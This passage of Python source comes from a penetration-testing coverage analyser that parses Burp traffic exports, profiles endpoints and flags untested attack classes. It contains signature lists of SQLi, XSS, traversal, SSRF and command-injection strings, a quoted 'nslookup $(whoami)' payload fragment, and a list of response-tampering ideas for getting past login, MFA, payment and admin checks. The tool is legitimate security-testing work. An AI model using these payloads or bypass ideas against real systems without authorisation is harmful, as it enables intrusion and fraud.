    b64 = resp.get('AsBase64')
    if b64:
        try:
            return base64.b64decode(b64).decode('utf-8', 'replace')
        except Exception:
            pass
    headers = resp.get('Headers') or ''
    body = resp.get('Body') or ''
    if not headers and not body:
        return ''
    return "{0}\r\n\r\n{1}".format(headers, body)


def _from_csv(row):
    """Maps Burp default CSV (ID,Time,Tool,Method,Protocol,Host,Port,URL,IP,
    Path,Query,Param count,Param names,Status code,Length,MIME type,Extension,
    Page title,...Request,Response) AND Logger++ CSV variants."""
    url = row.get('URL') or row.get('url') or row.get('Path', '')
    parsed = urlparse(url)
    raw_req = _maybe_b64_request(row.get('Request') or row.get('request') or '')
    raw_resp = _maybe_b64_response(row.get('Response') or row.get('response') or '')
    return {
        'method':      (row.get('Method') or row.get('method') or 'GET').upper(),
        'host':        row.get('Host') or row.get('host') or row.get('Hostname', ''),
        'path':        row.get('Path') or row.get('path') or parsed.path or '/',
        'query':       row.get('Query') or row.get('query') or parsed.query,
        'raw_request': raw_req,
        'raw_response': raw_resp,
        'status':      _safe_int(row.get('Status code'), row.get('Status'),
                                 row.get('ResponseStatus'), row.get('status'), 0),
        'resp_len':    _safe_int(row.get('ResponseBodyLength'), row.get('Length'),
                                 row.get('length'), 0),
        # Burp default CSV has a 'Tool' column (Proxy/Scanner/Intruder/Repeater/...).
        # This is definitive evidence of HOW an endpoint was tested.
        'tool':        row.get('Tool') or row.get('tool') or '',
        'timestamp':   row.get('Time') or row.get('time') or row.get('Timestamp') or '',
        'rtt':         _safe_int(row.get('RTT'), row.get('ResponseReceived'), 0) or None,
    }


def _maybe_b64_request(s):
    if not s:
        return ''
    stripped = s.strip()
    method_re = r'^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE|CONNECT)\b'
    if re.match(method_re, stripped):
        return s
    try:
        decoded = base64.b64decode(stripped).decode('utf-8', 'replace')
        if re.match(method_re, decoded) or 'HTTP/' in decoded[:256]:
            return decoded
    except Exception:
        pass
    return s


def _maybe_b64_response(s):
    """Burp's CSV base64-encodes the Response column; Logger++ may give raw.
    Return the decoded raw HTTP response text ('HTTP/1.1 200 ...')."""
    if not s:
        return ''
    stripped = s.strip()
    if stripped[:5].upper() == 'HTTP/':
        return s
    try:
        decoded = base64.b64decode(stripped).decode('utf-8', 'replace')
        if decoded[:5].upper() == 'HTTP/' or 'HTTP/' in decoded[:32]:
            return decoded
    except Exception:
        pass
    return s


def _parse_headers(raw):
    headers = {}
    if not raw:
        return headers
    for line in raw.split('\n')[1:]:
        line = line.strip()
        if not line:
            break
        if ':' in line:
            k, _sep, v = line.partition(':')
            headers[k.strip().lower()] = v.strip()
    return headers


def _flatten_json(obj, prefix=''):
    """Recurse a parsed JSON value into dotted/indexed keys so nested fields are
    visible to the classifiers (user.role, items[0].price) instead of being
    collapsed into one opaque value. This is what lets mass-assignment detection
    see a nested privilege key. Returns {dotted_key: [values]}."""
    out = {}
    if isinstance(obj, dict):
        if not obj and prefix:
            out.setdefault(prefix, []).append('{}')
        for k, v in obj.items():
            key = "{0}.{1}".format(prefix, _u(k)) if prefix else _u(k)
            if isinstance(v, (dict, list)):
                child = _flatten_json(v, key)
                if child:
                    for ck, cv in child.items():
                        out.setdefault(ck, []).extend(cv)
                else:
                    out.setdefault(key, []).append('')
            else:
                out.setdefault(key, []).append(_u(v))
    elif isinstance(obj, list):
        if not obj and prefix:
            out.setdefault(prefix, []).append('[]')
        for idx, v in enumerate(obj):
            key = "{0}[{1}]".format(prefix, idx)
            if isinstance(v, (dict, list)):
                child = _flatten_json(v, key)
                for ck, cv in child.items():
                    out.setdefault(ck, []).extend(cv)
            else:
                out.setdefault(key, []).append(_u(v))
    else:
        if prefix:
            out.setdefault(prefix, []).append(_u(obj))
    return out


_MULTIPART_BOUNDARY_RE = re.compile(r'boundary=("?)([^";\r\n]+)\1', re.I)
_CD_NAME_RE = re.compile(r'\bname="?([^";\r\n]+?)"?(?:;|\r|\n|$)', re.I)
_CD_FILENAME_RE = re.compile(r'\bfilename\*?="?([^";\r\n]*?)"?(?:;|\r|\n|$)', re.I)


def _parse_multipart(body, ct):
    """multipart/form-data -> {field_name: [value]} plus, for file parts,
    {field_name: [filename]} and a `field_name.filename` pseudo-param so the
    file-upload heuristic sees field names AND uploaded filenames/extensions."""
    out = {}
    m = _MULTIPART_BOUNDARY_RE.search(ct or '')
    if not m:
        return out
    boundary = '--' + m.group(2)
    for part in body.split(boundary):
        part = part.strip('\r\n')
        if not part or part == '--' or part.strip() == '--':
            continue
        seg = re.split(r'\r?\n\r?\n', part, maxsplit=1)
        head = seg[0]
        val = seg[1].rstrip('\r\n') if len(seg) > 1 else ''
        nm = _CD_NAME_RE.search(head)
        if not nm:
            continue
        name = nm.group(1).strip()
        fm = _CD_FILENAME_RE.search(head)
        if fm:
            fname = fm.group(1).strip()
            out.setdefault(name, []).append(fname)
            out.setdefault(name + '.filename', []).append(fname)
        else:
            out.setdefault(name, []).append(_u(val))
    return out


_XML_TAG_RE = re.compile(r'<\s*([A-Za-z_][\w\-.:]*)')
_XML_ATTR_RE = re.compile(r'([A-Za-z_][\w\-.:]*)\s*=\s*["\']')


def _parse_xml_params(body):
    """text/xml or application/xml -> expose element + attribute NAMES as params
    so the XXE/XML surface is visible to the analyser. The synthetic
    `__xml_doctype__` / `__xml_entity__` keys flag that a DOCTYPE/ENTITY was
    already present (i.e. XXE may have been attempted)."""
    out = {}
    low = body.lower()
    if '<!doctype' in low:
        out['__xml_doctype__'] = ['present']
    if '<!entity' in low or 'system "' in low or "system '" in low:
        out['__xml_entity__'] = ['present']
    for tag in _XML_TAG_RE.findall(body):
        t = tag.strip()
        if not t or t.startswith('!') or t.startswith('?') or t.lower() == 'xml':
            continue
        out.setdefault(t, []).append('')
    for attr in _XML_ATTR_RE.findall(body):
        out.setdefault(attr, []).append('')
    return out


def _parse_body_params(raw, ct):
    if not raw:
        return {}
    parts = re.split(r'\r?\n\r?\n', raw, maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        return {}
    body = parts[1].strip()
    ctl = (ct or '').lower()
    if 'application/json' in ctl or ctl.endswith('+json') or '+json' in ctl:
        try:
            parsed = json.loads(body)
            flat = _flatten_json(parsed)
            if flat:
                return flat
        except Exception:
            pass
    if 'multipart/form-data' in ctl:
        mp = _parse_multipart(body, ct)
        if mp:
            return mp
    if 'xml' in ctl:                       # text/xml, application/xml, +xml
        xml = _parse_xml_params(body)
        if xml:
            return xml
    try:
        return dict(parse_qs(body, keep_blank_values=True))
    except Exception:
        return {}


def _split_response(raw):
    """Split a raw HTTP response into (header-block, body). Body may be empty."""
    if not raw:
        return '', ''
    parts = re.split(r'\r?\n\r?\n', raw, maxsplit=1)
    head = parts[0]
    body = parts[1] if len(parts) > 1 else ''
    return head, body


def _parse_response_headers(raw):
    """(headers_dict, set_cookie_list) from a raw HTTP response. headers_dict is
    lower-name -> last value; Set-Cookie is collected separately as a list since
    a response can legitimately carry several."""
    headers = {}
    cookies = []
    head, _body = _split_response(raw)
    if not head:
        return headers, cookies
    for line in head.split('\n')[1:]:        # skip the status line
        line = line.strip()
        if not line or ':' not in line:
            continue
        k, _sep, v = line.partition(':')
        kl = k.strip().lower()
        vv = v.strip()
        if kl == 'set-cookie':
            cookies.append(vv)
        headers[kl] = vv
    return headers, cookies


def _normalise_path(path):
    """Collapse variable path segments (ids, UUIDs, Mongo ObjectIds, hex/base64
    tokens, email-shaped segments, and slugs after a collection noun) so that
    /user/john.doe, /docs/5f8a..., /products/blue-widget etc. do not each
    fragment into a separate 'endpoint' and inflate the report. Rules live in the
    auditable module-level PATH_SEGMENT_RULES list."""
    if not path:
        return path
    segs = path.split('/')
    out = []
    prev = ''
    for seg in segs:
        if seg == '':
            out.append(seg)
            continue
        placeholder = None
        for _name, matcher, ph in PATH_SEGMENT_RULES:
            try:
                hit = matcher(seg) if callable(matcher) else matcher.match(seg)
            except Exception:
                hit = None
            if hit:
                placeholder = ph
                break
        if placeholder is None and prev.lower() in COLLECTION_NOUNS and _RX_SLUG.match(seg):
            placeholder = '{slug}'
        out.append(placeholder if placeholder else seg)
        prev = seg
    return '/'.join(out)


def _identity_fingerprint(hdrs):
    """Stable, non-secret identity key for a request: hash of Authorization, else
    Cookie, else X-API-Key. Requests with no credential return 'anon'. Used to
    correlate which identity accessed which object id (IDOR/BOLA evidence)."""
    auth_val = (hdrs.get('authorization') or hdrs.get('cookie') or
                hdrs.get('x-api-key') or hdrs.get('x-auth-token') or
                hdrs.get('x-access-token') or '')
    auth_val = _u(auth_val).strip()
    if not auth_val:
        return 'anon'
    return hashlib.md5(auth_val.encode('utf-8')).hexdigest()[:12]


_GQL_FIELD_RE = re.compile(r'\b(query|mutation|subscription)\b\s*\w*\s*(?:\([^)]*\))?\s*\{\s*([A-Za-z_][\w]*)', re.I)


def _extract_graphql(p, raw_request, hdrs):
    """Read a GraphQL request body (JSON {query, operationName, variables} or a
    raw query string) and record the operations exercised + whether
    introspection (__schema/__type) was actually attempted."""
    ct = hdrs.get('content-type', '')
    _head, body = _split_response(raw_request)   # reuse: header/body splitter
    body = (body or '').strip()
    if not body:
        return
    query = ''
    opname = ''
    try:
        if 'json' in ct.lower() or body[:1] in ('{', '['):
            data = json.loads(body)
            if isinstance(data, list) and data:        # batched query
                data = data[0]
            if isinstance(data, dict):
                query = _u(data.get('query') or '')
                opname = _u(data.get('operationName') or '')
        if not query:
            query = body
    except Exception:
        query = body
    if opname:
        p.graphql_ops.add(opname)
    for _kw, field in _GQL_FIELD_RE.findall(query):
        if field and not field.startswith('__'):
            p.graphql_ops.add(field)
    if '__schema' in query or '__type' in query or 'IntrospectionQuery' in (opname + query):
        p.graphql_introspection = True


# Characters that never appear in a legitimate HTTP parameter NAME but do appear
# when an injected scan payload (containing & ; spaces $() ` etc.) is parsed by
# parse_qs and shredded into bogus "parameters". ASP.NET joiners ($ . [ ] : -)
# and word chars are allowed; whitespace, quotes, backslash and shell
# metacharacters are not.
_JUNK_PARAM_NAME = re.compile(r'[\s;|`<>(){}\'"\\]')
# Bare shell-command words that show up as param fragments from CMDi payloads
# (e.g. `;whoami`, `&id`). Only treated as junk when their value is empty, so a
# genuine `id=123` parameter is preserved.
_CMD_WORD_PARAMS = set([
    'whoami', 'id', 'ls', 'dir', 'cat', 'pwd', 'uname', 'ping', 'nslookup',
    'sleep', 'curl', 'wget', 'ifconfig', 'ipconfig', 'hostname', 'netstat',
    'net', 'ps', 'env', 'type', 'more', 'cmd', 'bash', 'sh', 'powershell',
    'echo', 'systeminfo', 'dig', 'host', 'traceroute', 'tracert',
])
_INJECTION_NAME_FRAGMENT = (
    '../', '..\\', '<script', 'etc/passwd', 'union select', 'or 1=1',
    '%0a', '%0d', 'waitfor delay', 'php://', 'file://', '169.254',
)


def _is_payload_fragment_param(name, values):
    """True if a parsed 'parameter' is actually a fragment of an injected scan
    payload (split out of a value by & / ; / whitespace), not a real app input.
    Filtering these removes the false positives a pentester sees after running
    an injection scan and then re-running CoverMap on the captured traffic."""
    n = _u(name)
    if _JUNK_PARAM_NAME.search(n):          # whitespace / shell metachars / quotes / backslash
        return True
    nl = n.strip().lower()
    if nl in _CMD_WORD_PARAMS:
        if all((v is None or _u(v).strip() == '') for v in values):
            return True
    for frag in _INJECTION_NAME_FRAGMENT:
        if frag in nl:
            return True
    return False


def _filter_payload_fragments(params):
    """Drop payload-fragment entries from a parsed {name: [values]} dict."""
    out = {}
    for k, v in params.items():
        if _is_payload_fragment_param(k, v):
            continue
        out[k] = v
    return out


# ============================================================
# PROFILER
# ============================================================

def build_profiles(requests):
    profiles = {}
    for req in requests:
        path = _normalise_path(req['path'])
        key = "{0}{1}".format(req['host'], path)
        eid = hashlib.md5(key.encode('utf-8')).hexdigest()[:12]
        hdrs = _parse_headers(req['raw_request'])
        _ct = hdrs.get('content-type', '').lower()
        bparams = _parse_body_params(req['raw_request'], hdrs.get('content-type', ''))
        qparams = {}
        try:
            qparams = dict(parse_qs(req['query'] or '', keep_blank_values=True))
        except Exception:
            qparams = {}

        # Strip payload-fragment "parameters" created when injected scan payloads
        # (containing & ; whitespace $() etc.) are split by parse_qs. Without this,
        # a CMDi/SQLi scan run produces dozens of bogus params like `whoami`,
        # `sleep 5`, `nslookup $(whoami).collab` -> false-positive gaps.
        bparams = _filter_payload_fragments(bparams)
        qparams = _filter_payload_fragments(qparams)

        if eid not in profiles:
            profiles[eid] = EndpointProfile(host=req['host'], path=path, endpoint_id=eid)
        p = profiles[eid]
        if 'xml' in _ct:
            p.xml_body_seen = True
        if 'multipart/form-data' in _ct:
            p.multipart_seen = True
        p.total_requests += 1
        p.methods_seen.add(req['method'])
        p.status_codes_seen.add(req['status'])
        p.response_lengths.append(req['resp_len'])

        tool = (req.get('tool') or '').strip()
        if tool:
            p.tools_seen.add(tool)
        tl = tool.lower()
        if 'scanner' in tl:
            p.scanner_hits += 1
        elif 'intruder' in tl:
            p.intruder_hits += 1

        # Per-request structural bookkeeping (presence, HPP, array, empty).
        if bparams:
            p.body_submit_count += 1
        for param, vals in bparams.items():
            p.body_params.setdefault(param, set()).update(vals)
            p.body_param_presence[param] = p.body_param_presence.get(param, 0) + 1
            if len(vals) > 1:                       # same key sent twice in ONE request -> HPP/array
                p.hpp_params.add(param)
            if '[]' in _u(param):
                p.array_params.add(param)
            if any((v is None or _u(v) == '') for v in vals):
                p.empty_value_params.add(param)

        if qparams:
            p.query_bearing_count += 1
        for param, vals in qparams.items():
            p.query_params.setdefault(param, set()).update(vals)
            p.query_param_presence[param] = p.query_param_presence.get(param, 0) + 1
            if len(vals) > 1:
                p.hpp_params.add(param)
            if '[]' in _u(param):
                p.array_params.add(param)
            if any((v is None or _u(v) == '') for v in vals):
                p.empty_value_params.add(param)

        any_auth = False
        for h in hdrs:
            if h in AUTH_HEADERS:
                any_auth = True
                break
        identity = _identity_fingerprint(hdrs)
        if any_auth:
            p.requests_with_auth += 1
            token = hdrs.get('authorization', hdrs.get('cookie', ''))
            p.auth_tokens_seen.add(token[:64])
        else:
            p.requests_without_auth += 1

        for h in hdrs:
            if h in SECURITY_HEADERS:
                p.headers_modified.add(h)

        # ── Cross-identity object access (IDOR/BOLA evidence) ──
        # Record, per identity, which id-like parameter VALUES were requested and
        # how successful the access was. Two different identities requesting the
        # same id value is what turns the IDOR check from a guess into evidence.
        status = req.get('status') or 0
        resp_len = req.get('resp_len') or 0
        for d in (qparams, bparams):
            for pname, pvals in d.items():
                if _u(pname).strip().lower() in FRAMEWORK_PARAMS:
                    continue
                if not IDOR_PARAM.search(_norm_param(pname)):
                    continue
                for v in pvals:
                    vv = _u(v).strip()
                    if not vv or len(vv) > 128:
                        continue
                    acc = p.identity_object_access.setdefault(identity, {})
                    cand = (status, resp_len)
                    prev = acc.get(vv)
                    if (prev is None or
                            (cand[0] == 200 and prev[0] != 200) or
                            (cand[0] == prev[0] and cand[1] > prev[1])):
                        acc[vv] = cand

        # ── RESPONSE capture (bounded) ──
        raw_resp = req.get('raw_response') or ''
        if raw_resp:
            rhdrs, rcookies = _parse_response_headers(raw_resp)
            for hk, hv in rhdrs.items():
                p.response_headers_seen.setdefault(hk, set()).add(hv[:256])
            for ck in rcookies:
                if len(p.set_cookies_seen) < 50:
                    p.set_cookies_seen.append(ck)
            _rhead, rbody = _split_response(raw_resp)
            rbody = rbody or ''
            if len(p.response_samples) < MAX_RESP_SAMPLES:
                p.response_samples.append({
                    'status': status, 'len': resp_len,
                    'ct': rhdrs.get('content-type', ''),
                    'body': rbody[:RESP_BODY_TRUNC],
                })
            # Reflected-value detection: a tested param value appearing verbatim in
            # the response body is real reflection -> drives XSS/reflection
            # confidence and suppresses the blind "XSS not tested" gap.
            if rbody:
                rblow = rbody.lower()
                for d in (qparams, bparams):
                    for pname, pvals in d.items():
                        if _u(pname).strip().lower() in FRAMEWORK_PARAMS:
                            continue
                        for v in pvals:
                            vv = _u(v).strip()
                            # Require a reasonably distinctive value so common
                            # words/short ids don't register as false reflections.
                            if len(vv) >= 6 and vv.lower() in rblow:
                                p.reflected_values.add(vv[:80])

        # ── GraphQL operation tracking ──
        if PATH_GRAPHQL.search(path):
            try:
                _extract_graphql(p, req['raw_request'], hdrs)
            except Exception:
                pass

        # ── Per-identity request order / timing ──
        ts = req.get('timestamp') or ''
        if ts or req.get('rtt'):
            qs = req.get('query') or ''
            path_with_qs = req['path'] + (("?" + qs) if qs else "")
            p.request_timeline.append((_u(ts), req['method'], identity, path_with_qs))
        if req.get('rtt'):
            try:
                p.response_times.append(float(req['rtt']))
            except Exception:
                pass

        if len(p.sample_requests) < 5:
            p.sample_requests.append({
                'method': req['method'], 'path': req['path'],
                'query_params': qparams, 'body_params': bparams,
                'status': req['status'], 'resp_len': req['resp_len'],
            })

    for p in profiles.values():
        p.behavior_class = _classify(p)
    return profiles


# Attack-payload signatures used to detect that an endpoint is being ACTIVELY
# tested (not merely browsed). If any tested value carries one of these, the
# endpoint is at least Repeater-class regardless of the param-count heuristic.
ATTACK_VALUE_SIGS = (
    "'", '"', '--', '/*', 'or 1=1', "or '1'='1", 'union', 'sleep', 'waitfor',
    '<script', '<svg', '<img', 'onerror', 'onload', 'onfocus', 'javascript:', 'alert(',
    '${', '{{', '#{', '<%=', '$ne', '$gt', '$regex', '{$',
    '../', '..\\', '%2e', '/etc/passwd', 'win.ini', 'php://',
    '169.254', '127.0.0.1', 'localhost', 'file://', 'gopher://', 'metadata',
    '%0d', '%0a', '*)(', '|(uid=',
)


def _has_attack_evidence(p):
    """True if the endpoint shows signs of active security testing:
    attack-signature values, duplicate-key/array params, or field removal.
    Used so an actively-tested endpoint is never mislabelled 'browse'."""
    if p.hpp_params or p.array_params or p.empty_value_params:
        return True
    if _detect_removed_params(p):
        return True
    for d in (p.query_params, p.body_params):
        for k, vals in d.items():
            if _u(k).strip().lower() in FRAMEWORK_PARAMS:
                continue
            for v in vals:
                lv = _u(v).lower()
                for s in ATTACK_VALUE_SIGS:
                    if s in lv:
                        return True
    return False


def _classify(p):
    # Burp Scanner / heavy Intruder => automated active testing (Intruder-class).
    if p.scanner_hits >= 20 or p.intruder_hits >= 50:
        return 'intruder'
    if p.scanner_hits >= 1 or p.intruder_hits >= 5:
        return 'repeater'
    if p.total_requests == 1:
        # Even a single request can be an active test if it carries a payload.
        return 'repeater' if _has_attack_evidence(p) else 'single'
    unique_len = len(set(p.response_lengths))
    unique_stat = len(p.status_codes_seen)
    all_params = {}
    all_params.update(p.query_params)
    all_params.update(p.body_params)
    param_var = sum(len(v) for v in all_params.values())
    if p.total_requests > 50:
        biggest = max([len(v) for v in all_params.values()] + [0])
        if biggest > 20:
            return 'intruder'
    # Active-testing evidence => Repeater-class (being deliberately exercised),
    # regardless of the fragile param_var > total_requests count heuristic.
    if _has_attack_evidence(p):
        return 'repeater'
    if p.total_requests >= 3 and (unique_stat > 1 or unique_len > 2 or param_var > p.total_requests):
        return 'repeater'
    return 'browse'


# ============================================================
# GAP ANALYSIS
# ============================================================

ASPNET_NOISE_TOKEN = re.compile(
    r'^(ctl\d+|ContentPlaceHolder\d*|PlaceHolder\d*|MainContent|MasterPage|'
    r'WebUserControl\d*|FormView\d*|wuc\w*|MasterContent)$', re.I)
ASPNET_CONTROL_PREFIX = re.compile(
    r'^(txt|btn|lbl|ddl|cb|chk|rb|hdn|lnk|pnl|gv|img|lv|fv|hf|wv|tbl|usr)([A-Z]\w*)$')


def _norm_param(name):
    """Normalise a parameter name for keyword classification.

    Splits on `$ _ . - [ ]`, drops ASP.NET framework noise tokens
    (ctl00, ContentPlaceHolder1, MasterPage, ...), strips ASP.NET
    control-name prefixes (txtEmail -> Email), then camelCase-splits.
    The original parameter name is still used for display in gaps -
    this normalisation only affects which regex classifiers match it,
    which kills a large class of false positives where framework
    wrapper words like 'Content' or 'Master' were matching real
    keywords like 'content' (file-upload) or 'master' (admin).
    """
    s = re.sub(r'[$_.\-\[\]]+', ' ', _u(name))
    tokens = s.split()
    cleaned = []
    for t in tokens:
        if ASPNET_NOISE_TOKEN.match(t):
            continue
        m = ASPNET_CONTROL_PREFIX.match(t)
        if m:
            t = m.group(2)
        cleaned.append(t)
    s = ' '.join(cleaned) if cleaned else s
    s = re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', s)
    s = re.sub(r'(?<=[A-Za-z])(?=[0-9])', ' ', s)
    return s


# Benign param names, normalised the SAME way _norm_param normalises observed
# names, so 'per_page' / 'perPage' / 'per-page' all reduce to the same token and
# match. Computed once at import.
_BENIGN_PARAM_NORM = set(_norm_param(b).strip().lower() for b in BENIGN_PARAM_NAMES)

# Value fragments that immediately disqualify a value from being "scalar-benign".
_BENIGN_DANGEROUS_BITS = ('/', '\\', '://', '..', '%2e', '<', '${', '{{')
_BENIGN_WORD_RE = re.compile(r'^[A-Za-z][A-Za-z]{0,23}$')   # short alpha word, no digits/symbols


def _is_benign_param(name):
    """True if `name` is a generic API param (pagination/sort/projection/locale)
    whose name only incidentally matches a value-shaped sink regex."""
    return _norm_param(name).strip().lower() in _BENIGN_PARAM_NORM


def _value_is_benign_scalar(v):
    """True if a single observed value is scalar-benign: numeric, asc/desc, or a
    short alpha word, AND carries none of the path/URL/template danger fragments."""
    s = _u(v).strip()
    if s == '':
        return True
    low = s.lower()
    for bad in _BENIGN_DANGEROUS_BITS:
        if bad in low:
            return False
    if re.match(r'^[+-]?\d+(\.\d+)?$', s):    # numeric (incl. signed / decimal)
        return True
    if low in ('asc', 'desc'):
        return True
    return bool(_BENIGN_WORD_RE.match(s))


def _observed_values(values):
    """Non-empty observed values (an empty string is 'present but no content')."""
    return [v for v in values if _u(v).strip() != '']


def _value_pathish(v):
    """A value that 'looked pathish': contains / or \\, a dot-segment, or a file
    extension (traversal / LFI value-shape precondition)."""
    s = _u(v).strip()
    if not s:
        return False
    low = s.lower()
    if '/' in s or '\\' in s or '..' in s or '%2e' in low or '%5c' in low or '%2f' in low:
        return True
    return bool(re.search(r'\.[A-Za-z0-9]{1,6}($|[?#/&])', s))   # e.g. file.txt, x.php?


def _value_urlish(v):
    """A value that 'looked URL/host-ish': scheme://, //, /\\, a /word path, or a
    bare hostname (open-redirect value-shape precondition)."""
    s = _u(v).strip()
    if not s:
        return False
    low = s.lower()
    if '://' in low or low.startswith('//') or low.startswith('/\\') or low.startswith(r'\/'):
        return True
    if re.match(r'^/\w', s):                       # /word relative path
        return True
    return bool(re.match(r'^[A-Za-z0-9][A-Za-z0-9.\-]*\.[A-Za-z]{2,}([:/?#].*)?$', s))   # host.tld


def _value_url_host_ip(v):
    """URL/host-ish OR a bare IP literal (SSRF value-shape precondition)."""
    if _value_urlish(v):
        return True
    s = _u(v).strip()
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}\b', s):   # IPv4
        return True
    return bool(re.match(r'^\[?[0-9A-Fa-f:]+\]?$', s) and s.count(':') >= 2)   # IPv6-ish


def _benign_scalar_skip(param, values):
    """Gate (a): True when `param` is a generic/benign API name AND every observed
    value is scalar-benign -> the value-shaped sink gap is a false positive for it.
    Returns False when the param was never observed with a value (keep legacy)."""
    if not _is_benign_param(param):
        return False
    obs = _observed_values(values)
    return bool(obs) and all(_value_is_benign_scalar(v) for v in obs)


def _value_shape_gate(param, values, shape_fn, shape_label):
    """Gates (a)+(b) for traversal / open-redirect / SSRF. Returns
    (should_flag, detail_suffix):
      * should_flag=False  -> suppress (benign-scalar param OR value-shape
        precondition unmet).
      * should_flag=True   -> raise the gap. If the param was never observed with
        a value, behaviour is unchanged (legacy flag). detail_suffix is non-empty
        only when we flag despite a benign name (so the report says why)."""
    if _benign_scalar_skip(param, values):
        return False, ''
    obs = _observed_values(values)
    if not obs:
        return True, ''                       # never observed with a value -> legacy behaviour
    if any(shape_fn(v) for v in obs):
        suffix = ''
        if _is_benign_param(param):
            suffix = (' (Generic/benign parameter name, but flagged because an observed '
                      'value looked {0}.)'.format(shape_label))
        return True, suffix
    return False, ''                          # value never looked like a sink value -> suppress


def _infer_fn(path):
    tags = set()
    for tag, rx in (('auth', PATH_AUTH), ('reset', PATH_RESET), ('register', PATH_REGISTER),
                    ('logout', PATH_LOGOUT), ('upload', PATH_UPLOAD), ('graphql', PATH_GRAPHQL),
                    ('api', PATH_API), ('admin', PATH_ADMIN), ('otp', PATH_OTP), ('export', PATH_EXPORT)):
        if rx.search(path):
            tags.add(tag)
    return tags


def _response_flip_targets(p, fn):
    """Build a CONCRETE list of response fields/statuses worth flipping on THIS endpoint.
    Driven by the path's inferred function, observed status codes, and observed
    parameter names - so the recommendation names actual likely fields, not generic
    'flip success:false to true' boilerplate."""
    targets = []
    all_param_names = set(_u(k).lower() for k in p.query_params)
    all_param_names |= set(_u(k).lower() for k in p.body_params)
    path_l = p.path.lower()

    # Auth-class endpoints (login, oauth, sso, token)
    if 'auth' in fn or any(tok in path_l for tok in ('login', 'signin', 'logon', 'authenticate', 'sso', 'oauth')):
        targets += [
            '"success":false -> true',
            '"authenticated":false -> true',
            '"isLoggedIn":false / "loggedIn":false -> true',
            '"error":"<msg>" -> "" (empty)',
            '"errorCode":<n> -> 0',
            '"twoFactorRequired":true / "mfaRequired":true -> false',
            '"requiresChallenge":true -> false',
        ]
    # Password reset flows
    if 'reset' in fn:
        targets += [
            '"tokenValid":false -> true',
            '"resetAllowed":false -> true',
            '"emailSent":false -> true (to confirm enum)',
            '"step":"verify" -> "complete"',
        ]
    # OTP / 2FA / verification
    if 'otp' in fn:
        targets += [
            '"verified":false -> true',
            '"otpValid":false / "codeValid":false -> true',
            '"requiresOtp":true / "mfaRequired":true -> false',
            '"attemptsRemaining":0 -> 999',
        ]
    # Admin / privileged surface
    if 'admin' in fn or any('admin' in n for n in all_param_names):
        targets += [
            '"isAdmin":false -> true',
            '"role":"user" -> "admin" (also "guest"/"member" -> "admin")',
            '"permissions":[] -> ["*"] (or known permission strings)',
            '"accessLevel":1 -> 99',
        ]
    # Registration
    if 'register' in fn:
        targets += [
            '"emailVerified":false -> true',
            '"accountCreated":false -> true',
            '"requiresVerification":true -> false',
        ]
    # Status-code flips (driven by what was actually observed)
    statuses = set(p.status_codes_seen)
    if 401 in statuses or 403 in statuses:
        targets.append('HTTP 401/403 -> 200 (response-body of an authorized request substituted in)')
    if 302 in statuses:
        targets.append('HTTP 302 redirect -> 200 with the gated body inlined')
    if 400 in statuses or 422 in statuses:
        targets.append('HTTP 400/422 -> 200 (server validates but client trusts status only)')
    if any(s >= 500 for s in statuses if isinstance(s, int)):
        targets.append('HTTP 5xx -> 200 (mask backend failure and observe client behaviour)')
    # Locked / disabled / blocked flags
    if any(re.search(r'(lock|disabl|block|suspend|ban)', n) for n in all_param_names):
        targets += [
            '"locked":true -> false',
            '"disabled":true -> false',
            '"blocked":true / "suspended":true -> false',
        ]
    # Verified / approved / active flags
    if any(re.search(r'(verif|approv|active|enabled|confirm)', n) for n in all_param_names):
        targets += [
            '"verified":false -> true',
            '"approved":false -> true',
            '"active":false / "enabled":false -> true',
            '"confirmed":false -> true',
        ]
    # Payment / order-state flags
    if any(re.search(r'(paid|payment|order|invoice|refund)', n) for n in all_param_names):
        targets += [
            '"paid":false -> true',
            '"paymentStatus":"pending" -> "paid"',
            '"orderStatus":"unpaid" -> "shipped"',
        ]
    # Subscription / plan / tier
    if any(re.search(r'(tier|plan|subscription|premium|trial)', n) for n in all_param_names):
        targets += [
            '"plan":"free" -> "premium" / "enterprise"',
            '"subscription":"trial" -> "active"',
            '"trialExpired":true -> false',
        ]
    # Account balance / credit
    if any(re.search(r'(balance|credit|points|wallet|coin)', n) for n in all_param_names):
        targets += [
            '"balance":0 -> 999999',
            '"credit":<n> -> 999999',
            '"insufficientFunds":true -> false',
        ]
    # Generic UI gating (always worth mentioning)
    targets.append('Hidden UI: enable disabled buttons, reveal masked fields (CC numbers, SSN, tokens), unhide gated sections.')
    return targets


def _decode_variants(v):
    """Return the lowercased value plus URL-decoded variants (up to two passes,
    both %20 and + styles) so encoded/double-encoded payloads still match the
    attack signatures. `%27%20OR%201=1` -> `' or 1=1`; `%2575nion` -> `union`."""
    out = []
    s = _u(v)
    out.append(s.lower())
    cur = s
    for _ in range(2):
        try:
            dec = unquote_plus(cur)
        except Exception:
            try:
                dec = unquote(cur)
            except Exception:
                break
        if dec == cur:
            break
        cur = dec
        out.append(cur.lower())
    return out


# Signature matching is word-boundary aware for "word-ish" signatures so that
# `union` no longer matches inside `reunion`, `or 1=1` inside an opaque value, or
# `id` inside `valid`. Symbol-bearing signatures (../  ' or '  <script  %0a)
# keep substring semantics because word boundaries don't apply to them.
_SIG_RX_CACHE = {}
_WORDISH_SIG_RE = re.compile(r'^[\w][\w\s=]*$')


def _compile_sig(sig):
    if _WORDISH_SIG_RE.match(sig):
        return re.compile(r'(?<!\w)' + re.escape(sig) + r'(?!\w)', re.I)
    return None     # signal: use plain substring


def _sig_present(value, sig):
    if sig not in _SIG_RX_CACHE:
        _SIG_RX_CACHE[sig] = _compile_sig(sig)
    rx = _SIG_RX_CACHE[sig]
    if rx is None:
        return sig in value
    return bool(rx.search(value))


def _has_sig(values, sigs):
    """True if any tested value (raw OR URL-decoded) carries an attack signature,
    matched with word-boundary awareness. Decoding lets encoded WAF-bypass
    payloads still count."""
    low = []
    for v in values:
        low.extend(_decode_variants(v))
    for s in sigs:
        for v in low:
            if _sig_present(v, s):
                return True
    return False


def _sig_strength(values, sigs):
    """Number of DISTINCT tested values that carry one of the signatures. Drives
    a confidence weight: a single payload on a single value is weak evidence and
    must not credit the whole attack class for the endpoint at full weight."""
    hits = set()
    for v in values:
        variants = _decode_variants(v)
        for s in sigs:
            if any(_sig_present(var, s) for var in variants):
                hits.add(_u(v)[:120])
                break
    return len(hits)


# ─────────────────────────────────────────────────────────────────
